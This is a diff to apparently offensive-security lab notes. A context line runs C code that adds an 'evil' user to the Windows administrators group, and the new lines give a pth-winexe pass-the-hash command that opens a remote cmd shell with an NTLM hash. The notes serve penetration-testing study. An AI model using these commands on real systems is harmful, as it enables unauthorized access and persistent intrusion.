@@ -125,3 +125,10 @@ i = system ("net localgroup administrators evil /add");
 return 0;
 }
 ```
+
+* Pass-The-Hash attacks
+
+```
+// https://github.com/byt3bl33d3r/pth-toolkit
+kali@kali:~$ pth-winexe -U offsec%aad3b435b51484eeaad3b435b51484ee:2892d26cdf84d7a78e2eb3b9f05c425e //10.11.0.22 cmd
+```
